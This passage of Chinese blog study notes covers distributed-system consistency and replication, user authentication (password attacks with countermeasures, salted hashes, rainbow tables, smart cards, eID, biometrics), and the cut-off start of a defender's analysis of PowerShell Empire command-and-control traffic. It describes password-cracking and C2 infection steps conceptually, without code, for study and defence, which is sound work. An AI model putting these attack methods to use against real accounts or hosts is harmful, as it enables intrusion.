class="line">如果一个进程对某个同步化变量正在进行互斥模式访问，那么其他进程就不能拥有该同步化变量</span><br><span class="line">（在更新数据项之前，进程必须以互斥模式进入临界区，以确保不会有其他进程视图同时更新该共享数据）</span><br><span class="line">某个进程对某个同步化变量的互斥模式访问完成后，除非该变量的拥有者执行完操作，否则任何其他进程对该变量的下一个非互斥模式访问也不允许</span><br><span class="line">（如果一个进程要以非互斥模式进入临界区，必须首先与该同步化变量的拥有者进行协商，确保临界区获得被保护共享数据的最新副本）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">入口一致性编程问题：</span><br><span class="line">1. 正确地把数据与同步化变量相关联（显示地告诉中间件将要访问的数据位置/隐式地把唯一同步化变量与每个已声明的对象相关联，有效地串行对该对象的所有调用）</span><br></pre></td></tr></table></figure><p><strong>一致性与相干性</strong></p><ul><li>一致性模式描述是多个进程并发地作用于数据地数据集，并且数据一致性关注的数据项集</li><li>相干性模型关注的只是单个数据项</li></ul><h2 id="以客户为中心的一致性模型（不会出现同时发生的更新操作或当出现同时发生的更新操作）"><a href="#以客户为中心的一致性模型（不会出现同时发生的更新操作或当出现同时发生的更新操作）" class="headerlink" title="以客户为中心的一致性模型（不会出现同时发生的更新操作或当出现同时发生的更新操作）"></a>以客户为中心的一致性模型（不会出现同时发生的更新操作或当出现同时发生的更新操作）</h2><p><strong>最终一致性模型（引入特殊的以客户为中心的一致性模型）</strong></p><ol><li>满足最终一致性的数据存储具有以下属性</li><li>没有更新操作时，所有副本逐渐成为相互完全相同的副本</li></ol><ul><li>Bayou本质上区分4种不同类型的一致性模型</li></ul><p><strong>单调读</strong></p><p>如果一个进程读取数据项x的值，那么该进程x执行的任何后续读操作将总是得到第一次读取的那个值或更新的值</p><p><strong>单调写</strong></p><p>一个进程对数据项x执行的写操作必须在该进程对x执行任何后续写操作之前完成</p><ul><li>单调写一致性与数据中心的FIFO一致性相似，FIFO本质是同一进程执行的写操作必须在任何地方以正确的顺序执行</li></ul><p><strong>读写一致性</strong></p><p>一个进程对数据项x执行一次写操作的结构总是会被该进程对x执行的后续读操作看见，也就是说一个写操作总是在同一进程执行的后续读操作之前完成，而不管这个后续读操作发生在什么位置</p><p><strong>写读一致性</strong></p><p>同一进程对数据项x所执行的任何后续写操作都会在x的副本上执行，而该副本是用该进程最近读取的值更新的</p><h1 id="复制管理"><a href="#复制管理" class="headerlink" title="复制管理"></a>复制管理</h1><p>对任何支持复制的分布式系统来说，关键问题是“决定何处、何时、由谁来防止副本以及用何种机制来保持副本的一致性”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">副本放置：</span><br><span class="line">副本服务器放置问题(找到放置托管部分数据存储的服务器的最佳位置)</span><br><span class="line">内容放置问题(找到放置内容的最佳服务器)</span><br></pre></td></tr></table></figure><p><strong>副本服务器放置</strong></p><ul><li>计算副本服务器的最佳位置的方法归根到底属于优化问题，本质是计算复杂性，只能通过探索式求解。</li><li>忽略客户位置，采用自治系统形成的网络拓扑</li><li>瞬时拥塞这种情况下，快速地确定副本服务器的位置很重要，然后就可以为内容放置选择一个特定服务器（Szymamiak:选择最能满足需要的区域，即具有最多结点，然后让该区域中的某个结点作为副本服务器）</li></ul><p><strong>内容复制与放置</strong></p><ul><li>永久副本</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Web站点为例：</span><br><span class="line">1. 单个位置的有限数量的服务器上复制构成站点的文件（循环提示器策略来进行转发）</span><br><span class="line">2. Web站点被复制到有限数量的服务器上称为镜像站点（相似方式也出现在分布式数据库中，这些服务器一起形成服务器群称为无共享体系结构）</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>服务器启动副本</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器启动副本是为提高性能而存在的数据存储副本，决定创建或删除副本的确切位置和时间</span><br><span class="line">1. 复制可能是为了减轻单台服务器的负载而进行的</span><br><span class="line">2. 单台服务器上的指定文件可能被转移或复制到对这些文件提出很多请求的客户附近的服务器</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">每台服务器跟踪每个文件的访问计数以及提出这些访问请求的位置</span><br><span class="line">1. 复制可能是为来减轻单台服务器的负载而进行的</span><br><span class="line">2. 单台服务器上的指定文件可能被转移或复制到对这些文件提出很多请求的客户附近的服务器（设置阈值“删除阈值”“复制阈值”）</span><br></pre></td></tr></table></figure><p>服务器启动的复制正在逐渐地流行起来，特别是在Web托管服务的环境下，只要可以保证每个数据项至少由一台服务器托管，那么只使用服务器启动的复制而不使用任何永久副本就足够了。but 永久副本用作备份工具或用作允许被修改以保证一致性的唯一副本但是服务器启动的副本则被用于客户附近放置只读副本。</p><ul><li>客户端启动副本</li></ul><p>在客户初始化时创建的副本，普遍将客户启动的副本称为客户高速缓存（高速缓存是一种本地存储工具，客户使用它暂时存储刚刚请求的数据副本）</p><ol><li>改善客户高速缓存只用于改善数据的访问时间（读取数据时客户在附近的高速缓存中存储所请求的数据可以提高性能）</li><li>当被请求的数据可以从本地副本获得时，称其为高速缓存命中（提高高速缓存命中数量，可以让客户共享高速缓存）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public one：客户高速缓存放置在客户所在的机器上，或者将其放置在客户所在的局域网上由各个客户共享的机器上。</span><br><span class="line">public two：在广域网的几个特定点放置高速缓存服务器，让客户查找距离最近的服务器</span><br></pre></td></tr></table></figure><p><strong>内容分发</strong></p><ul><li>状态与操作</li></ul><ol><li>只传播更新的通知</li><li>把数据从一个副本传送到另一个副本</li><li>把更新操作传播到其他副本</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">无效化协议:</span><br><span class="line"></span><br><span class="line">1、只传播一个通知而不传播别的消息，需要先根据数据存储支持的特定的一致性模型更新那个副本</span><br><span class="line">（几乎不占用网络带宽）</span><br><span class="line"></span><br><span class="line">2、多副本间传送被修改的数据（更新是通过将多个修改压缩到一个消息中的方式被组合传送，从而减少通信开销）</span><br><span class="line"></span><br><span class="line">3、不传送任何数据修改，告诉每个副本应该执行的更新操作，称为主动复制</span><br></pre></td></tr></table></figure><ul><li>拉协议与推协议</li></ul><p>基于推式方法称为基于服务器的协议（永久副本与服务器启动的副本之间使用），并应用于多个副本常常需要维持相对较高程度的一致性的时候<br>基于拉式方法称为基于客户的协议（客户告诉缓存）</p><table><thead><tr><th>服务器的状态</th><th>客户副本和高速缓存列表</th><th>无</th></tr></thead><tbody><tr><td>发送的消息(基于推式 )</td><td>更新</td><td>轮询和更新</td></tr><tr><td>客户响应时间(基于拉式)</td><td>立即</td><td>获取更新的时间</td></tr></tbody></table><hr><table><thead><tr><th>通信方式</th><th>客户响应时间</th><th>无</th></tr></thead><tbody><tr><td>服务器向每个客户发送更新</td><td>推入客户时，客户响应时间为0，其余与拉式相同</td><td></td></tr><tr><td>客户必须轮询服务器并必要时获取被修改的数据</td><td>由客户从服务器获取被修改的数据的时间决定</td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">基于租用的更新传播</span><br><span class="line"></span><br><span class="line">1、租用是服务器所作的承诺，将指定的时间内把更新推给客户，租用到期时根据客户被迫轮询服务器以实现更新</span><br><span class="line">2、在前一个租用到期时，客户请求一个新的租用以实现更新的推入</span><br><span class="line"></span><br><span class="line">a/: 基于数据项“年龄”</span><br><span class="line">b/: 基于特定客户请求更新高速缓存副本的频率相同</span><br><span class="line">c/: 基于服务器的状态空间开销的租用</span><br></pre></td></tr></table></figure><ul><li>单播与多播</li></ul><p>推（多播）与拉（单一客户或服务器请求更新其副本）的更新相关问题，需要决定选型单播还是多播 ？</p><ol><li>单播通信当作为数据存储的一部分的服务器向其他N台服务器发送更新，通过发送N个单独的消息实现</li><li>多播通信，底层网络负责向多个接收者高效地发送一个消息</li></ol><h1 id="一致性协议"><a href="#一致性协议" class="headerlink" title="一致性协议"></a>一致性协议</h1><p>一致性性协议描述特定一致性模型的实现</p><h2 id="持续一致性-1"><a href="#持续一致性-1" class="headerlink" title="持续一致性"></a>持续一致性</h2><p><strong>限定复制的数字偏差</strong></p><p><a href="https://cseweb.ucsd.edu/~vahdat/">Yu and Vahdat</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把数值偏差限定在一定范围内的解决方法</span><br></pre></td></tr></table></figure><p><strong>限定复制的新旧程度偏差</strong></p><p><strong>限定顺序偏差</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">副本服务器会暂时性地应用已提交给它地更新</span><br></pre></td></tr></table></figure><h2 id="基于主备协议"><a href="#基于主备协议" class="headerlink" title="基于主备协议"></a>基于主备协议</h2><p>处理操作地一直顺序地模型，顺序一致性是其操作可以通过加锁、事务来分组地模型</p><p><strong>远程写协议</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">性能问题：启动更新进程在被允许继续执行前，需等待较长时间</span><br><span class="line"></span><br><span class="line">1. 阻塞操作：更新</span><br><span class="line">2. 非阻塞操作：</span><br></pre></td></tr></table></figure><p><strong>本地写协议</strong></p><h2 id="复制的写协议"><a href="#复制的写协议" class="headerlink" title="复制的写协议"></a>复制的写协议</h2><p><strong>主动复制</strong><br><strong>基于多数表决的协议</strong></p><h2 id="高速缓存相关协议"><a href="#高速缓存相关协议" class="headerlink" title="高速缓存相关协议"></a>高速缓存相关协议</h2><h2 id="实现以客户为中心的一致性"><a href="#实现以客户为中心的一致性" class="headerlink" title="实现以客户为中心的一致性"></a>实现以客户为中心的一致性</h2><p>未来待续….. (意思就是说：懒得写了)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>身份认证特征底层逻辑</title>
      <link href="/josyaaa/2022/05/12/authenticate/"/>
      <url>/josyaaa/2022/05/12/authenticate/</url>
      
        <content type="html"><![CDATA[<h1 id="user-authenticate"><a href="#user-authenticate" class="headerlink" title="user authenticate"></a>user authenticate</h1><p><strong>身份识别就是用户向系统声称其身份的方法；用户认证则是建立该声称的有效做法</strong></p><ul><li>用户通过呈现一个凭证（例如用户）来识别自身以登录系统</li><li>系统通过交换认证信息来核实用户身份</li></ul><h2 id="data-user-authenticate-pulic"><a href="#data-user-authenticate-pulic" class="headerlink" title="data user authenticate pulic"></a>data user authenticate pulic</h2><hr><table><thead><tr><th>基本安全需求</th></tr></thead><tbody><tr><td>1. 识别信息系统用户，以用户的名义执行的进程，或设备</td></tr><tr><td>2. 认证这些用户、进程或设备的身份，作为允许访问组织信息系统的先决条件</td></tr></tbody></table><hr><table><thead><tr><th>派生的安全需求</th></tr></thead><tbody><tr><td>3. 使用多因素身份验证进行本地和网络的特权账户访问，以及非特权账户的网络访问</td></tr><tr><td>4. 对特权和非特权账户的网络当问采用防重放认证机制</td></tr><tr><td>5. 防止在定义的时间段内重用标识符</td></tr><tr><td>6. 在创建新口令时强制最小口令复杂度并更改字符</td></tr><tr><td>7. 禁止在规定的代（generation）数内重用口令</td></tr><tr><td>8. 允许临时口令用于系统登录，但需立即更改为永久口令</td></tr><tr><td>9. 允许临时口令用于系统登录，但需立即更改为永久口令</td></tr><tr><td>10. 仅存储和传输密码保护的口令</td></tr><tr><td>11. 认证信息的模糊化反馈</td></tr></tbody></table><hr><p><em><strong>用户认证的风险评估</strong></em></p><table><thead><tr><th>置信等级</th><th>潜在影响</th><th>风险范围</th></tr></thead><tbody><tr><td>等级1：几乎或完全不信任待证实身份的合法性</td><td>FIPS 199（联邦信息和信息系统安全分类标准）</td><td>参考各置信等级下的最大的潜在影响</td></tr><tr><td>等级2：部分提供待证实身份的合法性</td><td></td><td></td></tr><tr><td>等级3：高度信任待证实身份的合法性</td><td></td><td></td></tr><tr><td>等级4：极其高度地信任待证实身份的合法性</td><td></td><td></td></tr></tbody></table><h2 id="password-based-authentication"><a href="#password-based-authentication" class="headerlink" title="password based authentication"></a>password based authentication</h2><p>基于口令认证系统中，都会维护着一个以用户ID作为索引的口令文件</p><hr><table><thead><tr><th>口令攻击策略</th><th>口令攻击对策</th></tr></thead><tbody><tr><td>离线字典攻击（获取系统口令文件将其中的口令散列值与通常所用口令的散列值进行比较）</td><td>防止非授权访问口令文件；使用入侵检测技术对危及安全的行为进行识别；对口令文件中的不安全口令进行重新设置等</td></tr><tr><td>特定账户攻击（不断对特定账户猜测口令，知道发现口令）</td><td>设置不超过5次</td></tr><tr><td>常用口令攻击（用一个常用口令对大量的用户ID进行尝试）</td><td>禁止用户选择常用口令、对认证请求者的IP地址和用户提交模式的cookie进行扫描</td></tr><tr><td>单用户口令猜测（攻击者试图获得账户拥有者信息和系统口令保护策略）</td><td>训练并加强口令比阿虎策略以及使用户口令难于猜测</td></tr><tr><td>工作站劫持</td><td>工作站处于动态时采用自动注销机制&#x2F;也可同时使用入侵检测方案对用户行为变化进行检测</td></tr><tr><td>利用用户疏漏（如果是由系统分配口令，那么用户通常会把分配的口令记录下来）</td><td>包括用户培训、入侵检测、使用口令与其他认证机制的组合认证等</td></tr><tr><td>口令重复利用</td><td>禁止特定的网络设备相同或相近的口令</td></tr><tr><td>电子监视</td><td>简单加密不足以解决电子监视问题，本质上依旧是口令</td></tr></tbody></table><hr><h3 id="use-hash-function"><a href="#use-hash-function" class="headerlink" title="use hash function"></a>use hash function</h3><p>“hash function” and “sale value”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sale value ：</span><br><span class="line">1、防止复制的口令在口令文件中可见</span><br><span class="line">2、增加离线口令字典攻击的难度</span><br><span class="line">3、攻击者几乎不可能发现一个用户是否在两个或更多的系统中使用了相同的口令</span><br></pre></td></tr></table></figure><hr><table><thead><tr><th>UNIX 操作系统</th><th>威胁存在</th></tr></thead><tbody><tr><td>口令破解器</td><td>（在某台机器上用户可以通过guest账户或其他方法获得系统的访问权，然后运行口令猜测程序）</td></tr><tr><td>口令拷贝文件</td><td>如果攻击者能够得到一份口令额外你家爱你的拷贝，这个攻击者也可能会在另一台计算机上运行口令破解程序</td></tr></tbody></table><hr><table><thead><tr><th>UNIX( crypt(3) )</th><th>特点</th></tr></thead><tbody><tr><td>DES</td><td>（64位全0数据块）软件实现慢于硬件实现</td></tr><tr><td>MD5</td><td>（类似于SHA-1，但性能慢）</td></tr><tr><td>openBSD</td><td>基于Blowfish对称分组密码的散列函数（Bcrypt）</td></tr></tbody></table><hr><table><thead><tr><th>破解口令</th><th>方法</th></tr></thead><tbody><tr><td>口令猜测</td><td>开发一个庞大的口令字典并使用其中的每个口令文件进行尝试</td></tr><tr><td>预计潜在的散列值（以预计算潜在的散列值，以空间代价来换取）</td><td>对于口令字典中的每个口令，攻击者都要根据“sale value”进行散列运算，产生巨大的散列表为‘raindow table’</td></tr><tr><td>硬件和算法</td><td>马尔可夫模型显著减少口令空间的大小[TIMM10&#x2F;WETR09–&gt; KELL12&#x2F;ZHAN10]</td></tr></tbody></table><hr><p>口令文件访问策略：一种阻止口令攻击的方法是拒绝对手访问口令文件</p><ul><li>散列后的口令保存在与用户ID分离的单独文件，影子口令文件（shadow password file）</li></ul><hr><p>口令选择策略：</p><ol><li>用户教育</li><li>计算机生成口令</li><li>后验口令检查（FIPS 181）</li><li>先验口令检查（Jack the Ripper）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先验口令检查的方法：</span><br><span class="line"></span><br><span class="line">1、构造一个实施规则的简单系统（—NISP SP 800—63-3</span><br><span class="line">2、口令检查器（空间和时间复杂度较高）【pam_passwdqcc】</span><br><span class="line">3、bloom 过滤器（不在口令字典中的口令被拒绝的概率是很小的，在采用概率技术进行算法设计时，求解时间较少或求解过程比较简单）</span><br></pre></td></tr></table></figure><h3 id="Token-based-authentication"><a href="#Token-based-authentication" class="headerlink" title="Token based authentication"></a>Token based authentication</h3><p><em><strong>NIST SP 800-12（计算机安全入门：NIST手册，1995-10）</strong></em></p><table><thead><tr><th>卡的类型</th><th>定义的特征</th><th>实例</th></tr></thead><tbody><tr><td>凹凸卡</td><td>卡的正面凸印的字符</td><td>老式信用卡</td></tr><tr><td>磁条卡</td><td>卡的背面有磁条，正面有字符</td><td>银行卡</td></tr><tr><td>存储卡</td><td>卡的内部有电子存储单元</td><td>预付电话卡</td></tr><tr><td>智能卡</td><td>卡内有电子存储单元和处理器</td><td>生物特征ID卡</td></tr><tr><td>接触式</td><td>表面有电子触点</td><td>生物特征ID卡</td></tr><tr><td>非接触式</td><td>内部嵌有无线电通信装置</td><td>生物特征ID卡</td></tr></tbody></table><hr><table><thead><tr><th>存储卡</th><th>智能卡</th></tr></thead><tbody><tr><td>需要特殊的读卡器（读卡器需要软件和硬件来支持安全性）</td><td>物理特征（嵌入式微处理器）</td></tr><tr><td>令牌丢失（获取PIN就可以执行非授权的访问）</td><td>用户接口（人机接口包括键盘区和显示设备）</td></tr><tr><td>用户不满意（运用在计算机系统中，肯定不方便）</td><td>电子接口（智能卡或其他令牌通常需要配电子接口，用于读取或写入装置通信[接触式 and 非接触式]）</td></tr></tbody></table><hr><table><thead><tr><th>静态协议</th><th>动态口令生成器</th><th>挑战-应答协议</th></tr></thead><tbody><tr><td>首先完成自己对令牌的认证，之后令牌完成计算机对用户的认证</td><td>自动生成口令</td><td>计算机系统产生一个挑战信号，基于挑战信号的应答信号</td></tr></tbody></table><hr><p><em><strong>智能卡：完整的微处理器（处理器、内存、输入&#x2F;输出端口组成）</strong></em><br><em><strong>智能卡包含存储器：只读存储器（ROM）存储的数据在整个智能卡的生命周期都不会变化、电子可擦写可编程存储器（EEPROM）存储应用程序和数据、随机存取存储器（RAM）则保存应用程序执行时的临时数据</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">   ATR --&gt; PTS交涉协议 --&gt; PTS交涉应答 --&gt; 命令APDU --&gt; 响应APDU</span><br></pre></td></tr></table></figure><p><em><strong>APDU（应用协议数据单元）、 ATR（对复位信号的应答） 、PTS（协议类型选择）</strong></em></p><h3 id="Electronic-ID-card"><a href="#Electronic-ID-card" class="headerlink" title="Electronic ID card"></a>Electronic ID card</h3><p>电子身份证应用的德国电子身份证（neuer Personalausweis）:</p><ul><li>个人信息</li><li>文档编号</li><li>卡片接入很好</li><li>机器读卡区</li></ul><p>电子身份证的功能：</p><ol><li>ePass是存储标识持有者身份的数字信息（必须在智能卡嗓门实现）</li><li>eID是政府和商业的各种应用中通用</li><li>eSign是存储私钥和用于验证私钥的证书，用于生成持有人的数字签名</li></ol><table><thead><tr><th>功能</th><th>目的</th><th>PACE（口令认证连接设施）命令</th><th>数据</th><th>用途</th></tr></thead><tbody><tr><td>ePass（强制）</td><td>授权的离线检测系统读取数据</td><td>CAN（卡片接入号） or MRZ（机器读卡区）</td><td>面部特征;两个指纹图像；MRZ数据</td><td>用于专为政府部门保留的离线生物特征进行身份验证</td></tr><tr><td>eID（可选激活）</td><td>在线应用读取数据或访问授权功能 &#x2F; 离线检测系统读取数据并更新住址和社区ID</td><td>eID PIN &#x2F; eID PIN</td><td>姓名、艺名等</td><td>身份证明、年龄验证、社区ID验证、受限的身份证明等</td></tr><tr><td>eSign（可选证书）</td><td>认证在线安装签名证书 &#x2F; 公民利用eSign的PIN生成数字签名</td><td>eID PIN &#x2F; CAN</td><td>数字签名密钥，X.509证书</td><td>数字签名生成</td></tr></tbody></table><hr><p><strong>用户认证 eID 在线应用例子：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line"></span><br><span class="line">user -&gt;&gt; user: 1.用户请求</span><br><span class="line">user -&gt;&gt; system server: 2.服务请求</span><br><span class="line">system server -&gt;&gt; user: 3.重定向到eID消息</span><br><span class="line">user -&gt;&gt; eID server: 4.认证请求</span><br><span class="line">eID server -&gt;&gt; user: 5.PIN请求</span><br><span class="line">user --&gt; user: 6.用户输入PIN</span><br><span class="line">user --&gt; eID server: 7.认证协议交互</span><br><span class="line">eID server -&gt;&gt; user: 8.用于重定向的认证结果</span><br><span class="line">user -&gt;&gt; system server: 9.转发认证结果</span><br><span class="line">system server -&gt;&gt; user: 10.服务授权</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p><strong>生物特征认证系统：</strong></p><p><em><strong>1.注册</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">     A[用户接口RIN] --&gt; B[生物特征传感器]</span><br><span class="line">     B --&gt; C[特征提取器]</span><br><span class="line">     C --&gt; d1[(生物特征数据库)]</span><br><span class="line">     d1 --&gt; A</span><br></pre></td></tr></table></figure><hr><p><em><strong>2.验证</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">     A[用户接口RIN] --&gt; B[生物特征传感器]</span><br><span class="line">     B --&gt; C[特征提取器]</span><br><span class="line">     C --&gt; D[特征匹配器] --&gt; true/false</span><br><span class="line">     C --&gt; |一个模版| d1[(生物特征数据库)]</span><br><span class="line">     d1 --&gt; A</span><br></pre></td></tr></table></figure><hr><p><em><strong>3.识别</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">     A[用户接口RIN] --&gt; B[生物特征传感器]</span><br><span class="line">     B --&gt; C[特征提取器]</span><br><span class="line">     C --&gt; D[特征匹配器] --&gt; 用户身份/未识别用户</span><br><span class="line">     C --&gt; |N个模版| d1[(生物特征数据库)]</span><br><span class="line">     d1 --&gt; A</span><br></pre></td></tr></table></figure><hr><h3 id="remote-user-authentication"><a href="#remote-user-authentication" class="headerlink" title="remote user authentication"></a>remote user authentication</h3><ul><li>口令协议：随机数作为函数可以抵御重放攻击</li><li>令牌协议、静态生物特征认证协议、动态生物特征认证协议</li></ul><hr><table><thead><tr><th>攻击</th><th>认证手段</th><th>实例</th><th>典型防范措施</th></tr></thead><tbody><tr><td>客户端攻击</td><td>口令&#x2F;令牌&#x2F;生物特征</td><td>口令猜解，穷举搜索&#x2F;穷举搜索&#x2F;虚假匹配</td><td>提高熵、限制尝试次数</td></tr><tr><td>主机攻击</td><td>口令&#x2F;令牌&#x2F;生物特征</td><td>窃取明文，字典，穷举搜索&#x2F;窃取验证码&#x2F;窃取模版</td><td>采取散列函数、提高熵、保护口令数据库&#x2F;使用一次性验证码&#x2F;挑战-应答协议</td></tr><tr><td>窃听、盗窃和复制</td><td>口令&#x2F;令牌&#x2F;生物特征</td><td>肩窥&#x2F;盗窃，伪造硬件&#x2F;复制生物特征</td><td>多因素认证&#x2F;使用防止篡改的令牌&#x2F;管理员及时更换易破解的口令&#x2F;提高用户保密意识</td></tr><tr><td>重放</td><td>口令&#x2F;令牌&#x2F;生物特征</td><td>重访窃取的口令响应信息&#x2F;重访被窃取的认证码响应信息&#x2F;重访被窃取的生物特征模板响应信息</td><td>挑战-应答协议&#x2F;一次性验证码</td></tr><tr><td>特洛伊木马</td><td>口令&#x2F;令牌&#x2F;生物特征</td><td>安装窃听软件或信息截获设备</td><td>客户端认证或采取安全可信的采集装备</td></tr><tr><td>拒绝服务</td><td>口令&#x2F;令牌&#x2F;生物特征</td><td>通过多次失败的认证将用户锁定</td><td>带令牌的多因素认证</td></tr></tbody></table><p><strong>生物特征认证案例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">     A0[虹膜认证工作站0] --&gt; B[局域网交换机]</span><br><span class="line">     A1[虹膜认证工作站1] --&gt; B[局域网交换机]</span><br><span class="line">     A2[虹膜认证工作站2] --&gt; B[局域网交换机]</span><br><span class="line">     E0[虹膜认证引擎0] --&gt; B</span><br><span class="line">     E1[虹膜认证引擎1] --&gt; B</span><br><span class="line">     C[虹膜数据库] --&gt; B</span><br><span class="line">     D[网络交换机] --&gt; C</span><br><span class="line">     F[虹膜合并远程操作] --&gt; D</span><br></pre></td></tr></table></figure><p><strong>ATM系统的安全案例：</strong></p><ul><li>持卡人：拥有借记卡的个人</li><li>发卡机构：发行借记卡给持卡人的机构</li><li>处理商：为发卡机构提供核心数据处理、电子转账以及其他服务的组织机构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[Internet] --&gt; B[发卡机构]</span><br><span class="line">    B --&gt; D[处理商] --&gt; E[EFT交换]</span><br><span class="line">    C[发卡机构拥有ATM] --&gt; D</span><br><span class="line">    E --&gt; D</span><br><span class="line">    D --&gt; F[发卡机构的内部网络]</span><br><span class="line">    F --&gt; A</span><br><span class="line">    F --&gt; C</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>端点被感染后的C&amp;C流量</title>
      <link href="/josyaaa/2022/05/12/c2c/"/>
      <url>/josyaaa/2022/05/12/c2c/</url>
      
        <content type="html"><![CDATA[<h1 id="C-amp-C（命令和控制）"><a href="#C-amp-C（命令和控制）" class="headerlink" title="C&amp;C（命令和控制）"></a>C&amp;C（命令和控制）</h1><p>作为防御者站出来深入了解 C&amp;C（命令和控制）流量的外观，以及如何将其与正常用户行为区分开来</p><h1 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h1><p>假设一个端点被感染，以及随后在 RSA NetWitness 中对来自 PowerShell Empire 的流量进行的分析</p><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><ul><li>attack C&amp;C does not explain</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&gt;攻击者设置了一个包含其有效负载的恶意页面。然后，攻击者可以使用网络钓鱼电子邮件诱使受害者访问该页面。用户打开页面后，将执行一个感染端点且对最终用户不可见的 PowerShell 命令：</span><br><span class="line">&gt;</span><br><span class="line">然后端点开始与攻击者的 C2 通信。从这里，攻击者可以执行诸如 tasklist、  whoami 和其他工具之类的命令：</span><br><span class="line"></span><br><span class="line">&gt;</span><br><span class="line">这里开始，指挥和控制将继续以指定的时间间隔发出信标，以检查命令。这通常是分析师需要查找的内容，以确定他们的哪些端点被感染。</span><br><span class="line">使用 RSA NetWitness 网络/数据包数据的检测</span><br><span class="line"></span><br><span class="line">&gt;</span><br><span class="line">由于通过 HTTP 进行的通信，观察到的活动才可能发生。如果这是 SSL，则通过数据包进行检测将更加困难。这就是为什么强烈推荐引入 SSL 解密/拦截/卸载的原因。SSL 